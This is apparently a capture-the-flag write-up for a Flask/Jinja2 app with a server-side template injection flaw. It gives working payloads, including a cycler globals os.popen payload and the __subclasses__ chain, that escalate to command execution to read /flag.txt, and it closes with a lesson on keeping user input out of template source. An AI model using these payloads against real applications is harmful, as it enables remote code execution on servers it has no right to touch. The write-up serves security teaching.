# SSTI to RCE — Greetly (Jinja2)

A Flask app that drops the `name` query parameter into a Jinja2
template string before rendering — the textbook SSTI sink. Jinja
auto-escape doesn't save you here because the user input is in the
*template*, not in the *data*.

## Player target

Read `/flag.txt` via SSTI -> Python sandbox escape -> RCE.

## Author solution sketch

1. Confirm SSTI:

   ```
   GET /greet?name={{7*7}}
   -> Hello 49!
   ```

2. Walk the MRO from any literal to reach `subclasses()` and find a
   Python class that gives you process control — `os._wrap_close`,
   `subprocess.Popen`, or `pty.spawn` depending on Python build.
   One single-shot payload that works on modern Python 3.12 builds:

   ```
   /greet?name={{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
   ```

   `cycler` is in the Jinja default namespace; its `__init__` has a
   `__globals__` dict containing `os`. `os.popen(...)` returns a
   stream; `.read()` is rendered into the template.

3. Or the classic explicit subclasses path:

   ```
   /greet?name={{ ''.__class__.__mro__[1].__subclasses__() }}
   ```
   …find the index of `<class 'os._wrap_close'>`, then:
   ```
   /greet?name={{ ''.__class__.__mro__[1].__subclasses__()[N]()._module.__builtins__['__import__']('os').popen('cat /flag.txt').read() }}
   ```

## Why this is the lesson

Templates are **code**. User-controlled text must go in as *data*
to a pre-compiled template (`render_template("hello.html",
name=name)`), never spliced into the template source. The split
between "data" and "template" is the entire security model.
